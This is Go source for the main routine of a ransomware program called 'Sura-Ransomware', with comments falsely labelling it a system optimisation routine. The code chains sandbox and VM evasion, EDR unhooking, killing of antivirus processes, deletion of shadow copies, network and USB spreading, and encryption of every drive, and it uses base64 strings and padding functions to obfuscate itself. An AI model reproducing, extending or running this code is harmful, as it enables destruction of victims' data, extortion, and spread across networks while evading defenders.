// OBFUSCATED
// System optimization routine
// Memory management system
package main

import (
	"Sura-Ransomware/antiav"
	Configuration "Sura-Ransomware/configuration"
	"Sura-Ransomware/destruction"
	"Sura-Ransomware/envkey"
	"Sura-Ransomware/evasion"
	"Sura-Ransomware/filewalker"
	"Sura-Ransomware/lotl"
	"Sura-Ransomware/memory"
	"Sura-Ransomware/phantom"
	"Sura-Ransomware/polymorphic"
	"Sura-Ransomware/quantum"
	"Sura-Ransomware/spreading"
	"Sura-Ransomware/stealth"
	"Sura-Ransomware/unhook"
	"Sura-Ransomware/vxapi"
	"encoding/base64"
	"os"
	"time"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

func main() {
	// Phase -2: VX-API Enhanced Checks (ULTRA EVASION)
	// Advanced anti-debug, anti-VM, anti-sandbox techniques from VX-Underground
	if vxapi.RunVXAPIChecks() {
		// Multiple analysis indicators detected - exit silently
		time.Sleep(Configuration.GetSandboxDelay())
		return
	}

	// Phase -1: CRITICAL - Unhook EDR before anything else
	// This removes API hooks from ntdll.dll and kernel32.dll that EDRs use for monitoring
	if Configuration.EnableEDRUnhooking {
		unhook.UnhookAll()
	}

	// Phase -0.5: NOVEL - Quantum State Validation (NEVER SEEN BEFORE)
	// Validates execution using true hardware entropy and timing characteristics
	// VMs and sandboxes CANNOT replicate this - they have predictable timing and fake entropy
	if Configuration.EnableQuantumStateValidation {
		if !quantum.IsQuantumStateValid() {
			// Hardware characteristics don't match physical system
			// This is a VM, sandbox, or emulator - exit silently
			time.Sleep(Configuration.GetSandboxDelay())
			return
		}
	}

	// Phase 0: Polymorphic initialization - changes binary behavior on each run
	if Configuration.EnablePolymorphicCode {
		polymorphic.MetamorphicInit()
	}

	// Phase 0.25: NOVEL #3 - Phantom Thread Injection (THREAD BIRTH HIJACKING)
	// Executes code in suspended threads that appear as Windows service threads
	// Most stealthy execution method - no CreateRemoteThread, no APC, no suspicious APIs
	if Configuration.EnablePhantomThreads {
		phantom.InitializePhantomThreads()
	}

	// Environmental Keying - Only execute on intended targets
	if Configuration.EnableEnvironmentalKeying {
		if !envkey.VerifyEnvironment(Configuration.TargetFingerprint) {
			// Wrong target, exit silently
			time.Sleep(Configuration.GetSandboxDelay())
			return
		}

		if Configuration.CheckForAnalysisTools && envkey.CheckForAnalysisTools() {
			// Analysis tools detected, exit silently
			time.Sleep(Configuration.GetSandboxDelay())
			return
		}

		if Configuration.CheckForSandboxNames && envkey.CheckForSandboxArtifacts() {
			// Sandbox detected, exit silently
			time.Sleep(Configuration.GetSandboxDelay())
			return
		}
	}

	// Phase 1: Anti-AV techniques - block updates, kill AV processes, corrupt databases
	if Configuration.EnableAntiAVTechniques {
		antiav.InitializeAntiAV()
	}

	// Phase 2: Living-Off-The-Land techniques (uses only Windows built-in tools)
	// This looks like normal admin activity instead of malware
	lotl.InitializeLOTL()

	// Phase 3: Initialize stealth techniques
	stealth.InitializeStealth() // Poison memory to confuse memory dumps (if enabled)
	if Configuration.EnableMemoryPoisoning {
		go memory.PoisonMemory(Configuration.MemoryPoisonSize)
	}

	// Perform anti-sandbox and anti-VM checks
	if !evasion.ShouldExecute() {
		// Exit silently if in sandbox/VM
		time.Sleep(Configuration.GetSandboxDelay())
		return
	}

	// Initial delay before execution (escape sandbox timeout)
	time.Sleep(Configuration.GetInitialDelay())

	// Additional random delay
	time.Sleep(Configuration.GetRandomDelay())

	// Make files non-recoverable (delete shadow copies, etc.)
	// Now uses PowerShell/WMI instead of direct vssadmin (LOTL technique)
	if Configuration.DeleteShadowCopies || Configuration.DisableSystemRestore {
		destruction.MakeNonRecoverable()
	}

	// Start network spreading in background
	if Configuration.EnableNetworkSpreading || Configuration.EnableUSBSpreading {
		spreading.StartSpreading()
	}

	// Main encryption loop wrapped in Phantom Thread execution
	drives := getDrives()

	if Configuration.EnablePhantomThreads && Configuration.PhantomChainExecution {
		// Distribute encryption across phantom threads
		payloads := make([]func(), len(drives))
		for i, drive := range drives {
			drivePath := drive + d("OlxcXA==")
			payloads[i] = func() {
				filewalker.EncryptDirectory(drivePath)
			}
		}
		phantom.PhantomChainExecute(payloads)
	} else if Configuration.EnablePhantomThreads {
		// Execute through single phantom thread
		phantom.ShadowExecute(func() {
			for _, drive := range drives {
				filewalker.EncryptDirectory(drive + d("OlxcXA=="))
			}
		})
	} else {
		// Fallback to direct execution
		for _, drive := range drives {
			filewalker.EncryptDirectory(drive + d("OlxcXA=="))
		}
	}

	setWallpaperInMemory()

	// Cleanup phantom thread traces
	if Configuration.EnablePhantomThreads {
		phantom.CleanupPhantomTraces()
	}
}

func setWallpaperInMemory() {
	// Download wallpaper directly to memory without writing to disk
	imageData, err := memory.DownloadToMemory(Configuration.WallpaperURL)
	if err != nil {
		return
	}

	// Set wallpaper from memory buffer
	err = memory.SetWallpaperFromMemory(imageData)
	if err != nil {
		return
	}

	// Securely wipe memory after use
	memory.SecureWipeMemory(imageData)
}

func getDrives() (r []string) {
	letters := d("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=")
	suffix := d("Olxc")

	for _, drive := range letters {
		f, err := os.Open(string(drive) + suffix)
		if err == nil {
			r = append(r, string(drive))
			f.Close()
		}
	}

	return
}

// Obfuscation padding
func obf_81989() {
	_ = 7191
	var _ = "q9oZ5zLpGq01oxVIEhj1bbCOehT4rP4fkCrSlZu30U0iL4lPQa"
}

// Obfuscation padding
func obf_60154() {
	_ = 2144
	var _ = "y1nYFvIzs1KQI5tCdUK3uDn6j9lSQ1vODkPNbhzx5TlcZxpYvo"
}

// Obfuscation padding
func obf_43069() {
	_ = 2069
	var _ = "zg7cO8v8O22dZVAtyjVsreWAZbTRrfWYY4lamzn7hJScpaqd52"
}

// Obfuscation padding
func obf_25534() {
	_ = 2356
	var _ = "X9kAdRAYP9oPWcnQb0qzXwGkZizy8IhqTnTOsXt3fcqeEoNdfq"
}

// Obfuscation padding
func obf_51984() {
	_ = 7031
	var _ = "eOYXFClbCU7pJKhrjqoY2h3lLwG3pGeVEoCho1apwwDsaUS9JY"
}
